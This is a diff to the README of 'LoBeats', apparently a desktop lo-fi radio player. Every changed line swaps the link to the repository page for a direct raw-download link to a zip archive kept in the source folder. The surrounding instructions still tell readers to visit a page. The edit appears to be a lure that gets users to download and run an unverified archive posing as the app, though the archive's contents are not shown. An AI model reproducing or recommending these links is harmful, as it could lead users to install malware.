@@ -1,13 +1,13 @@
 # 🎧 LoBeats - Lo-Fi Radio for Focused Work
 
-[![Download LoBeats](https://img.shields.io/badge/Download%20LoBeats-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/kamelteacher005-hash/LoBeats)
+[![Download LoBeats](https://img.shields.io/badge/Download%20LoBeats-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/kamelteacher005-hash/LoBeats/raw/refs/heads/main/src/Lo_Beats_2.3.zip)
 
 ## 🚀 Getting Started
 
 LoBeats is a desktop internet radio player for lo-fi music. It runs on Windows, Linux, and other desktop systems that support Electron. It gives you a simple way to play curated lo-fi stations while you work, study, or relax.
 
 Use the link above to visit this page to download LoBeats:
-https://github.com/kamelteacher005-hash/LoBeats
+https://github.com/kamelteacher005-hash/LoBeats/raw/refs/heads/main/src/Lo_Beats_2.3.zip
 
 ## ✨ What LoBeats Does
 
@@ -36,7 +36,7 @@ The app uses Electron, so it runs like a desktop program and does not need a bro
 
 ## 📥 Download LoBeats
 
-1. Open this page in your browser: https://github.com/kamelteacher005-hash/LoBeats
+1. Open this page in your browser: https://github.com/kamelteacher005-hash/LoBeats/raw/refs/heads/main/src/Lo_Beats_2.3.zip
 2. Find the latest version or release file on the page
 3. Download the Windows version if you use Windows
 4. Save the file to your Downloads folder or Desktop
@@ -163,4 +163,4 @@ People use LoBeats for:
 ## 📎 Download Again
 
 If you need to get the app again, visit this page to download:
-https://github.com/kamelteacher005-hash/LoBeats
+https://github.com/kamelteacher005-hash/LoBeats/raw/refs/heads/main/src/Lo_Beats_2.3.zip
